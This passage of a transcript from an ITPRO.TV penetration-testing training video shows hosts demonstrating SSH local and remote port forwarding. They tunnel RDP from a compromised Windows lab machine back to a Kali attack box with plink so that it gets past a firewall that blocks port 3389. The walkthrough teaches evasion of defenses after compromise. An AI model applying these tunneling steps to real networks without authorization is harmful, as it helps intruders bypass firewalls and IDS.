Macbook.\n\n175\n00:09:43.760 --> 00:09:47.410\nMy Macbook is this guy,\nthe clam machine in this scenario.\n\n176\n00:09:49.170 --> 00:09:53.630\nSo we're gonna bind our local ports,\nthat's why we're using 127, but\n\n177\n00:09:53.630 --> 00:09:56.880\nwe're binding in port 80 locally,\nthat's the service.\n\n178\n00:09:56.880 --> 00:10:02.190\nI know, if this is what is he talking\nabout cuz it's a little crazy.\n\n179\n00:10:02.190 --> 00:10:05.450\nI know how to do this, and every time,\nI have to stop and go, okay, Lowrie,\n\n180\n00:10:05.450 --> 00:10:09.870\nget it straight in your head,\nwe're doing SSH tunneling.\n\n181\n00:10:09.870 --> 00:10:13.390\nSo I'm going to bind a local\nport on a local machine, and\n\n182\n00:10:13.390 --> 00:10:17.900\nwhen I use my browser,\nI'm gonna connect to my local port.\n\n183\n00:10:17.900 --> 00:10:22.924\nThat local port resides on my local host,\nhence the 127.0.0.1,\n\n184\n00:10:22.924 --> 00:10:27.010\ninstead of the way we did it before,\nwhich was port forwarding okay?\n\n185\n00:10:28.100 --> 00:10:32.720\nHopefully that makes sense, so the host\nwill connect the egress allowed port and\n\n186\n00:10:32.720 --> 00:10:35.510\nreceive data from the proxy.\n\n187\n00:10:35.510 --> 00:10:38.000\nAnd because we're using a SSH guess what?\n\n188\n00:10:38.000 --> 00:10:39.320\nEncrypted traffic.\n\n189\n00:10:39.320 --> 00:10:40.350\n&gt;&gt; Perfect.\n&gt;&gt; That's always nice.\n\n190\n00:10:40.350 --> 00:10:41.570\n&gt;&gt; They can't even see what I'm doing.\n\n191\n00:10:41.570 --> 00:10:43.639\n&gt;&gt; IDSs, IPSs you're having\na hard time at this point.\n\n192\n00:10:45.170 --> 00:10:51.570\nSo [LAUGH] let's do that,\nlet's configure our SSH, using a port that\n\n193\n00:10:51.570 --> 00:10:55.620\nthe client's firewall doesn't block, which\nis fine, the 8080 is what we've chosen.\n\n194\n00:10:55.620 --> 00:11:01.840\nThen we connect from the client's, so\nthis is the client's, bring up a terminal.\n\n195\n00:11:01.840 --> 00:11:02.690\nI'm sorry, not a terminal.\n\n196\n00:11:03.870 --> 00:11:04.660\nYes, a terminal.\n\n197\n00:11:04.660 --> 00:11:05.220\nWhere's my terminal?\n\n198\n00:11:07.303 --> 00:11:09.990\nTerminal.\n\n199\n00:11:09.990 --> 00:11:11.900\nAnd that's part of the process here.\n\n200\n00:11:11.900 --> 00:11:17.963\nYou have to open a terminal SSH and\nyou'll say user at that proxy so\n\n201\n00:11:17.963 --> 00:11:24.450\nyou have to create a user account for\nSSH, and then log in using that.\n\n202\n00:11:24.450 --> 00:11:30.468\nSo I've got that FTP2@192.168.219.146.\n\n203\n00:11:30.468 --> 00:11:35.808\nAnd then we'll say -l and\nthen we'll give it that port number\n\n204\n00:11:35.808 --> 00:11:41.047\ncause that's the local port\nthat we wanna bind, 8080,\n\n205\n00:11:41.047 --> 00:11:45.890\nand then you do a colon and\nyou say where do you want to go?\n\n206\n00:11:45.890 --> 00:11:48.480\nOr where do you want to redirect to?\n\n207\n00:11:48.480 --> 00:11:53.795\nThat's gonna be our Windows machine\nthat's a really awesome website.\n\n208\n00:11:53.795 --> 00:11:58.712\nSo 192.168 I know how bad it is,\nthat's why I make fun of it, 19.200, and\n\n209\n00:11:58.712 --> 00:12:01.850\nthen, whatever port that is on,\nif I'm not mistaken.\n\n210\n00:12:01.850 --> 00:12:08.380\nYeah, so that's on port 80, and\nthen we should be good to go.\n\n211\n00:12:08.380 --> 00:12:12.690\nI'm pretty sure, yeah, if we hit return,\nit's gonna ask us for our password,\n\n212\n00:12:12.690 --> 00:12:16.980\ntype that in and\nnow we've made a connection.\n\n213\n00:12:16.980 --> 00:12:18.220\nThat's cool, the connection is made.\n\n214\n00:12:18.220 --> 00:12:21.970\nThe connection needs to be established for\nthis to work.\n\n215\n00:12:21.970 --> 00:12:25.416\nWe can then now open our browser and\ngo to,\n\n216\n00:12:25.416 --> 00:12:30.546\nI will close this link,\nI'll reopen it, so it's not there.\n\n217\n00:12:30.546 --> 00:12:38.280\nI will go to 127.0.0.1 port 8080,\nlike that.\n\n218\n00:12:38.280 --> 00:12:40.250\nWe wait for a sec, and look.\n\n219\n00:12:40.250 --> 00:12:41.770\n&gt;&gt; Voila.\n&gt;&gt; So we get the exact same kind of\n\n220\n00:12:41.770 --> 00:12:43.590\noutput, just in a different way.\n\n221\n00:12:43.590 --> 00:12:46.270\nAnd in this time,\nwe're using some encryption, okay?\n\n222\n00:12:46.270 --> 00:12:54.990\nSo very cool, that moves us on to\nremote port forwarding with SSH.\n\n223\n00:12:54.990 --> 00:12:58.340\nSo this is done from a compromised system.\n\n224\n00:12:58.340 --> 00:13:00.130\nI have a lovely diagram for this as well.\n\n225\n00:13:01.430 --> 00:13:02.460\nI can close this session.\n\n226\n00:13:04.070 --> 00:13:06.290\nKeep the terminal around\njust in case we'll need it,\n\n227\n00:13:06.290 --> 00:13:07.920\nwhich I'm pretty sure we will.\n\n228\n00:13:07.920 --> 00:13:09.540\nRemote port forwarding with SSH.\n\n229\n00:13:10.600 --> 00:13:15.170\nSo now the firewall is blocking\nall ports except port 80,\n\n230\n00:13:15.170 --> 00:13:19.030\ncuz apparently this is a web server\nthat we've compromised, port 443,\n\n231\n00:13:19.030 --> 00:13:23.790\nagain web, and then port 22 for\nSSH connectivity on the outside.\n\n232\n00:13:23.790 --> 00:13:29.040\nSo this is very administratively set up,\nbut we've compromised maybe the web API,\n\n233\n00:13:29.040 --> 00:13:33.290\nwe've done a SQL injection attack,local or\n\n234\n00:13:33.290 --> 00:13:37.440\nremote file inclusion attack, and\nwe've gained shell to this thing.\n\n235\n00:13:37.440 --> 00:13:41.490\nNow, we need to be able\nto give things to it,\n\n236\n00:13:41.490 --> 00:13:43.410\nmaybe move files, or something like that.\n\n237\n00:13:43.410 --> 00:13:46.520\nBut it's blocking,\nI don't have SSH connectivity.\n\n238\n00:13:46.520 --> 00:13:50.230\nI don't know the user name and\npassword yet, but I wanna get files so\n\n239\n00:13:50.230 --> 00:13:53.880\nthat I can maybe FG Dump,\nsomething like that.\n\n240\n00:13:53.880 --> 00:13:56.100\nSo that's why you might wanna use this.\n\n241\n00:13:56.100 --> 00:13:59.300\nSo here are the commands\nwe're gonna be using,\n\n242\n00:13:59.300 --> 00:14:03.350\nSSH User1 into our attack system, and\n\n243\n00:14:03.350 --> 00:14:07.990\nthen we're actually gonna remote desktop\nit, so that's the attack platform here.\n\n244\n00:14:07.990 --> 00:14:12.390\nRemote desktop, I do not see in\nthe exceptions over here Port 3389,\n\n245\n00:14:12.390 --> 00:14:13.650\ndo you see that Mike?\n\n246\n00:14:13.650 --> 00:14:14.325\nIt's not showing.\n\n247\n00:14:14.325 --> 00:14:17.390\n&gt;&gt; [INAUDIBLE]\n&gt;&gt; Nope, so for our intents and purposes,\n\n248\n00:14:17.390 --> 00:14:19.450\nPort 3389 is being blocked.\n\n249\n00:14:19.450 --> 00:14:25.197\nSo if I'm the attacker over here,\neven though I've compromised the machine,\n\n250\n00:14:25.197 --> 00:14:30.084\nI can't just fire up our desktop and\nsay our desktop user, user1,\n\n251\n00:14:30.084 --> 00:14:34.920\n192168, 219, 200,\nhit Enter I'm gonna get nope.\n\n252\n00:14:34.920 --> 00:14:40.260\nThat's cannot contact, gonna get an error,\nbecause the firewall is blocking it.\n\n253\n00:14:40.260 --> 00:14:42.690\nHow can I bypass that type of security?\n\n254\n00:14:42.690 --> 00:14:44.600\nThis is how we can do that.\n\n255\n00:14:44.600 --> 00:14:49.860\nSo let's see here,\nfrom the compromised server,\n\n256\n00:14:49.860 --> 00:14:55.490\nin this case the compromised server is\ngoing to be our Windows 7 box, okay?\n\n257\n00:14:56.580 --> 00:14:57.590\nSo let's jump over there.\n\n258\n00:14:59.640 --> 00:15:05.790\nAnd from here, I'm logged in, and I'm\ngonna say I could actually compromise it.\n\n259\n00:15:05.790 --> 00:15:07.640\nWe've seen that with\na buffer of a flow attack.\n\n260\n00:15:07.640 --> 00:15:10.180\nI could do that and\ncompromise it that way but,\n\n261\n00:15:10.180 --> 00:15:13.050\nfor ease of use, what do you think Mike?\n\n262\n00:15:13.050 --> 00:15:15.470\nShould I actually compromise\nthe machine and then do it?\n\n263\n00:15:15.470 --> 00:15:18.670\n&gt;&gt; I wanna make sure we get through\nall of this wonderful information.\n\n264\n00:15:18.670 --> 00:15:19.430\n&gt;&gt; Mike's like, I'm ready man.\n\n265\n00:15:19.430 --> 00:15:21.570\n&gt;&gt; You guys have seen\nthe compromised before, so\n\n266\n00:15:21.570 --> 00:15:24.350\nlet's just okay now that's\nbeen compromised, what's next?\n\n267\n00:15:24.350 --> 00:15:27.680\n&gt;&gt; All right so we're going to start from,\nwe have compromise this machine and\n\n268\n00:15:27.680 --> 00:15:29.670\nwe only have a black box terminal.\n\n269\n00:15:29.670 --> 00:15:33.410\nSo we bring our black box terminal\nmaybe we've use our FTP commands we so\n\n270\n00:15:33.410 --> 00:15:34.060\nit before.\n\n271\n00:15:34.060 --> 00:15:39.140\nOur transfer fund to get,\nI love the little SSH client because\n\n272\n00:15:39.140 --> 00:15:43.710\ntypically not seeing us client it's\ninstalled on Windows machines.\n\n273\n00:15:43.710 --> 00:15:45.756\nWe're gonna need that, cuz we need SSH.\n\n274\n00:15:45.756 --> 00:15:51.142\nI like plink, it's a great SSH client,\nit does SSH, so find your copy of plink.\n\n275\n00:15:51.142 --> 00:15:56.099\nGoogle, Oracle or the Internet,\ngrab that and file transfer it over.\n\n276\n00:15:56.099 --> 00:15:57.659\n&gt;&gt; Can you [INAUDIBLE] Azure?\n\n277\n00:15:57.659 --> 00:15:58.214\n&gt;&gt; Surely.\n\n278\n00:15:58.214 --> 00:15:59.511\n&gt;&gt; You know I can.\n\n279\n00:15:59.511 --> 00:16:01.782\nThank you for reminding me, Michael.\n\n280\n00:16:01.782 --> 00:16:05.068\nLet me scooch that over there.\n\n281\n00:16:05.068 --> 00:16:07.864\nHopefully that's a little better for\nyou good folks out there.\n\n282\n00:16:07.864 --> 00:16:10.342\n&gt;&gt; Much better.\n&gt;&gt; All right, so I've installed PLINK,\n\n283\n00:16:10.342 --> 00:16:14.430\nI've dropped it into system 32 so\nI can call it from anywhere.\n\n284\n00:16:14.430 --> 00:16:18.710\nI just say plink- l.\n\n285\n00:16:18.710 --> 00:16:22.743\nIt's gonna look very similar to the way\nwe did the SSH one, just a minute ago.\n\n286\n00:16:22.743 --> 00:16:28.003\n-l, our user is FTP2, we'll say -pw,\n\n287\n00:16:28.003 --> 00:16:32.103\nwhich is saying take a password.\n\n288\n00:16:32.103 --> 00:16:35.338\nOur password is password1.\n\n289\n00:16:35.338 --> 00:16:39.808\nMaybe we've already compromised\nthat password, and we've got that.\n\n290\n00:16:39.808 --> 00:16:43.838\nActually, I'm sorry, that's the password\nof our user on the SSH machine,\n\n291\n00:16:43.838 --> 00:16:44.900\nthat's what it is.\n\n292\n00:16:44.900 --> 00:16:48.420\nI use password1 so much, I don't even\nknow which user I'm [LAUGH] referring to.\n\n293\n00:16:48.420 --> 00:16:53.490\nAnd then we say what SSH server\nare we trying to contact?\n\n294\n00:16:53.490 --> 00:16:55.848\nThat's our attacking box, our Kali box.\n\n295\n00:16:55.848 --> 00:16:59.103\n192.168.219.146 for me.\n\n296\n00:17:00.170 --> 00:17:05.480\nThen we say -R and\nthat's basically how we bind a service.\n\n297\n00:17:05.480 --> 00:17:11.647\nNow we need to use a different,\nwe're basically saying use a local port,\n\n298\n00:17:11.647 --> 00:17:19.055\nand don't use the same one as the port\nyou're trying to connect with back, right?\n\n299\n00:17:19.055 --> 00:17:23.420\nI like to use probably like one off,\nso we're trying to connect to 3389,\n\n300\n00:17:23.420 --> 00:17:25.179\nso I'll use 3388, okay?\n\n301\n00:17:25.179 --> 00:17:30.827\nSo I'll say 3388:127.0.0.1.\n\n302\n00:17:30.827 --> 00:17:34.493\nRemember, it's a local port\nto my attacking machine,\n\n303\n00:17:34.493 --> 00:17:37.700\nnot the compromised machine,\nvery important.\n\n304\n00:17:39.370 --> 00:17:44.250\nAll right and then colon the port you\nwant to actually contact, so 3389.\n\n305\n00:17:44.250 --> 00:17:47.440\nSo it knows what to redirect, all right.\n\n306\n00:17:47.440 --> 00:17:50.260\nThat all being said, I hit return.\n\n307\n00:17:50.260 --> 00:17:54.940\nIt's now giving me a shell\nprompt cuz I'm logged in.\n\n308\n00:17:54.940 --> 00:17:56.645\nI'm getting actual Linux access.\n\n309\n00:17:56.645 --> 00:17:59.160\nObviously there's nothing there or\nit's just limited.\n\n310\n00:18:00.210 --> 00:18:01.910\nBut I go back to my Kali machine.\n\n311\n00:18:01.910 --> 00:18:04.590\nI can control out like that.\n\n312\n00:18:06.100 --> 00:18:08.576\nAnd now we run our desktop, okay.\n\n313\n00:18:08.576 --> 00:18:15.015\nSo we say rdesktop, 127.0.0.1,\n\n314\n00:18:15.015 --> 00:18:18.325\nand then :3388.\n\n315\n00:18:18.325 --> 00:18:20.586\nCuz remember, when we bound the port,\n\n316\n00:18:20.586 --> 00:18:23.610\nwe bound it to a local port\non the attacking machine.\n\n317\n00:18:23.610 --> 00:18:27.400\nAnd it wasn't the same port,\nwe're gonna redirect to that port.\n\n318\n00:18:27.400 --> 00:18:32.456\nSo we're gonna redirect any 3389 traffic\nthrough SSH to our attacking machine.\n\n319\n00:18:32.456 --> 00:18:34.926\nThrough port 3388.\n\n320\n00:18:34.926 --> 00:18:38.908\nIf that all goes well we should\nbe receiving a remote desktop,\n\n321\n00:18:38.908 --> 00:18:42.672\nwhich is being blocked and\nnow I can log in as another user.\n\n322\n00:18:42.672 --> 00:18:48.899\nI have hacker and\nwhatever his password is.\n\n323\n00:18:48.899 --> 00:18:51.288\nAnd there you go, and\nit's giving me a log on message.\n\n324\n00:18:51.288 --> 00:18:53.280\nBut I won't kick myself out.\n\n325\n00:18:53.280 --> 00:18:54.000\nBut that's it right?\n\n326\n00:18:54.000 --> 00:18:55.250\nWe used SSH.\n\n327\n00:18:55.250 --> 00:18:56.641\nEncrypt that traffic,\n\n328\n00:18:56.641 --> 00:19:00.820\nredirect ports that are being blocked\nby a firewall to get around that.\n\n329\n00:19:00.820 --> 00:19:03.080\nSo very twisty thing.\n\n330\n00:19:03.080 --> 00:19:05.950\nYou're gonna have to spend some time\nwrapping your brain around that.\n\n331\n00:19:05.950 --> 00:19:08.700\nThe simple diagram will be available for\nyou.\n\n332\n00:19:08.700 --> 00:19:11.380\nAll my notes obviously will be available\nfor you, so do take some time with this.\n\n333\n00:19:11.380 --> 00:19:15.960\nIt does get mind-boggling\nto keep it all straight.\n\n334\n00:19:15.960 --> 00:19:16.968\nThere are more advanced.\n\n335\n00:19:16.968 --> 00:19:20.240\nYou can do dynamic host port forwarding.\n\n336\n00:19:20.240 --> 00:19:22.687\nCreate SOCKS4 and 5 proxies.\n\n337\n00:19:22.687 --> 00:19:24.206\nThat gets a little more advanced, and\n\n338\n00:19:24.206 --> 00:19:26.130\nmaybe one day I will come back and\ndo that.\n\n339\n00:19:26.130 --> 00:19:29.941\nBut for right now I think you got a good\nfoundation to be able to work around\n\n340\n00:19:29.941 --> 00:19:30.640\nfirewalls.\n\n341\n00:19:30.640 --> 00:19:33.280\n&gt;&gt; Well fantastic stuff there, Daniel.\n\n342\n00:19:33.280 --> 00:19:34.630\nReally good explanations.\n\n343\n00:19:34.630 --> 00:19:36.830\nGreat demonstrations as always.\n\n344\n00:19:36.830 --> 00:19:39.710\nAnd now these are techniques as\na pen tester, I need to know.\n\n345\n00:19:39.710 --> 00:19:42.757\nBecause I need to see if the company\nI'm doing this pen test on is\n\n346\n00:19:42.757 --> 00:19:43.800\nvulnerable to this.\n\n347\n00:19:43.800 --> 00:19:46.270\nThey're telling me that we've\nsecured it best we can.\n\n348\n00:19:46.270 --> 00:19:48.210\nOur firewall,\nyou're not gonna get through it.\n\n349\n00:19:48.210 --> 00:19:49.820\nYou're not gonna get around it.\n\n350\n00:19:49.820 --> 00:19:50.450\nWell let's see.\n\n351\n00:19:50.450 --> 00:19:53.140\nLet's see if we can take some\nof these techniques and do that.\n\n352\n00:19:53.140 --> 00:19:55.380\nSo we need to make sure\nwe're familiar with those.\n\n353\n00:19:55.380 --> 00:19:56.240\nWe appreciate that.\n\n354\n00:19:56.240 --> 00:19:59.270\nWe hope everybody out there\nenjoyed watching this one.\n\n355\n00:19:59.270 --> 00:20:02.280\nSigning off for ITPRO.TV,\nI've been your host Mike Rodrick.\n\n356\n00:20:02.280 --> 00:20:03.150\n&gt;&gt; And I'm Daniel Lowrie.\n\n357\n00:20:03.150 --> 00:20:05.488\n&gt;&gt; And we'll see you next time.\n\n358\n00:20:05.488 --> 00:20:11.570\n[MUSIC]\n\n359\n00:20:11.570 --> 00:20:14.583\n&gt;&gt; Thank you for watching ITPRO.TV.\n\n",
